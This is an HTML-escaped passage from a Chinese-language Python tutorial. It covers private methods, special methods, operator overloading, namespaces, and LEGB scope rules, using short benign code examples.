&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;类的方法-1&#34;&gt;&lt;a href=&#34;#类的方法-1&#34; class=&#34;headerlink&#34; title=&#34;类的方法&#34;&gt;&lt;/a&gt;类的方法&lt;/h4&gt;&lt;p&gt;在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 &lt;strong&gt;self&lt;/strong&gt;，且为第一个参数，&lt;strong&gt;self&lt;/strong&gt; 代表的是类的实例&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;self&lt;/strong&gt; 的名字并不是规定死的，也可以使用 &lt;strong&gt;this&lt;/strong&gt;，但是最好还是按照约定使用 &lt;strong&gt;self&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;类的私有方法&#34;&gt;&lt;a href=&#34;#类的私有方法&#34; class=&#34;headerlink&#34; title=&#34;类的私有方法&#34;&gt;&lt;/a&gt;类的私有方法&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;__private_method&lt;/strong&gt;：两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用&lt;strong&gt;self.__private_methods&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Site&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; url&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; name       &lt;span class=&#34;token comment&#34;&gt;# public&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; url   &lt;span class=&#34;token comment&#34;&gt;# private&lt;/span&gt;
 
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;name  : &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;url : &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__url&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;          &lt;span class=&#34;token comment&#34;&gt;# 私有方法&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;这是私有方法&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;            &lt;span class=&#34;token comment&#34;&gt;# 公共方法&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;这是公共方法&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__foo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Site&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;菜鸟教程&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;www.runoob.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;who&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;# 正常输出&lt;/span&gt;
x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;foo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;# 正常输出&lt;/span&gt;
x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__foo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;      &lt;span class=&#34;token comment&#34;&gt;# 报错&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
name  :  菜鸟教程
url :  www.runoob.com
这是公共方法
这是私有方法
Traceback (most recent call last):
  File xxxx in &amp;lt;module&amp;gt;
    x.__foo()  # 报错
AttributeError: &#39;Site&#39; object has no attribute &#39;__foo&#39;
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;类的专有方法&#34;&gt;&lt;a href=&#34;#类的专有方法&#34; class=&#34;headerlink&#34; title=&#34;类的专有方法&#34;&gt;&lt;/a&gt;类的专有方法&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;init&lt;/strong&gt; :&lt;/strong&gt; 构造函数，在生成对象时调用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;del&lt;/strong&gt; :&lt;/strong&gt; 析构函数，释放对象时使用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;repr&lt;/strong&gt; :&lt;/strong&gt; 打印，转换&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;setitem&lt;/strong&gt; :&lt;/strong&gt; 按照索引赋值&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;getitem&lt;/strong&gt;:&lt;/strong&gt; 按照索引获取值&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;len&lt;/strong&gt;:&lt;/strong&gt; 获得长度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;cmp&lt;/strong&gt;:&lt;/strong&gt; 比较运算&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;call&lt;/strong&gt;:&lt;/strong&gt; 函数调用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;add&lt;/strong&gt;:&lt;/strong&gt; 加运算&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;sub&lt;/strong&gt;:&lt;/strong&gt; 减运算&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;mul&lt;/strong&gt;:&lt;/strong&gt; 乘运算&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;truediv&lt;/strong&gt;:&lt;/strong&gt; 除运算&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;mod&lt;/strong&gt;:&lt;/strong&gt; 求余运算&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;strong&gt;pow&lt;/strong&gt;:&lt;/strong&gt; 乘方&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;运算符重载&#34;&gt;&lt;a href=&#34;#运算符重载&#34; class=&#34;headerlink&#34; title=&#34;运算符重载&#34;&gt;&lt;/a&gt;运算符重载&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Vector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
      self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a
      self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b
 
   &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__str__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
      &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Vector (%d, %d)&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   
   &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__add__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;other&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
      &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; Vector&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; other&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;b &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; other&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
v1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Vector&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
v2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Vector&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v1 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; v2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# Vector(7,8)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;命名空间和作用域&#34;&gt;&lt;a href=&#34;#命名空间和作用域&#34; class=&#34;headerlink&#34; title=&#34;命名空间和作用域&#34;&gt;&lt;/a&gt;命名空间和作用域&lt;/h2&gt;&lt;h3 id=&#34;命名空间&#34;&gt;&lt;a href=&#34;#命名空间&#34; class=&#34;headerlink&#34; title=&#34;命名空间&#34;&gt;&lt;/a&gt;命名空间&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;命名空间(Namespace)是从名称到对象的映射，大部分的命名空间都是通过 Python 字典来实现的&lt;/li&gt;
&lt;li&gt;各个命名空间是独立的，所以一个命名空间中不能有重名，不同的命名空间可以重名&lt;/li&gt;
&lt;li&gt;命名空间的生命周期取决于对象的作用域，如果对象执行完成，则该命名空间的生命周期就结束&lt;/li&gt;
&lt;li&gt;无法从外部命名空间访问内部命名空间的对象&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;三种命名空间&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;内置名称（built-in names&lt;/strong&gt;）， Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;全局名称（global names）&lt;/strong&gt;，模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;局部名称（local names）&lt;/strong&gt;，函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;查找顺序为：&lt;strong&gt;局部的命名空间去 -&amp;gt; 全局命名空间 -&amp;gt; 内置命名空间&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果找不到变量，它将放弃查找并引发一个 NameError 异常&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# var1 是全局名称&lt;/span&gt;
var1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;some_func&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
 
    &lt;span class=&#34;token comment&#34;&gt;# var2 是局部名称&lt;/span&gt;
    var2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;some_inner_func&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
 
        &lt;span class=&#34;token comment&#34;&gt;# var3 是内嵌的局部名称&lt;/span&gt;
        var3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;作用域&#34;&gt;&lt;a href=&#34;#作用域&#34; class=&#34;headerlink&#34; title=&#34;作用域&#34;&gt;&lt;/a&gt;作用域&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;作用域就是一个 Python 程序可以直接访问命名空间的正文区域&lt;/li&gt;
&lt;li&gt;程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;四种作用域&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;L（Local）&lt;/strong&gt;：最内层，包含局部变量，比如一个函数/方法内部&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;E（Enclosing）&lt;/strong&gt;：包含了非局部(non-local)也非全局(non-global)的变量。比如两个嵌套函数，一个函数（或类） A 里面又包含了一个函数 B ，那么对于 B 中的名称来说 A 中的作用域就为 nonlocal&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;G（Global）&lt;/strong&gt;：当前脚本的最外层，比如当前模块的全局变量。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;B（Built-in）&lt;/strong&gt;： 包含了内建的变量/关键字等，最后被搜索。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;规则顺序： &lt;strong&gt;L –&amp;gt; E –&amp;gt; G –&amp;gt; B&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;g_count &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 全局作用域&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;outer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    o_count &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 闭包函数外的函数中&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;inner&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        i_count &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 局部作用域&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;内置作用域通过一个名为 builtin 的标准模块来实现&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; builtins

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;builtins&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出预定义变量&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Python 中只有模块（module），类（class）以及函数（def、lambda）才会引入新的作用域，其它的代码块（如 if/elif/else/、try/except、for/while等）是不会引入新的作用域的，也就是说这些语句内定义的变量，外部也可以访问&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    msg &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;I am from Runoob&#39;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 外部可以访问&lt;/span&gt;
    
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    msg_inner &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;I am from Runoob&#39;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 外部不能访问&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;全局变量和局部变量&#34;&gt;&lt;a href=&#34;#全局变量和局部变量&#34; class=&#34;headerlink&#34; title=&#34;全局变量和局部变量&#34;&gt;&lt;/a&gt;全局变量和局部变量&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域&lt;/li&gt;
&lt;li&gt;局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问&lt;/li&gt;
&lt;li&gt;调用函数时，所有在函数内声明的变量名称都将被加入到作用域中&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;total &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 这是一个全局变量&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 可写函数说明&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; arg1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arg2 &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#返回2个参数的和.&#34;&lt;/span&gt;
    total &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; arg1 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; arg2 &lt;span class=&#34;token comment&#34;&gt;# total在这里是局部变量.&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;函数内是局部变量 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; total&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; total
 
&lt;span class=&#34;token comment&#34;&gt;#调用sum函数&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
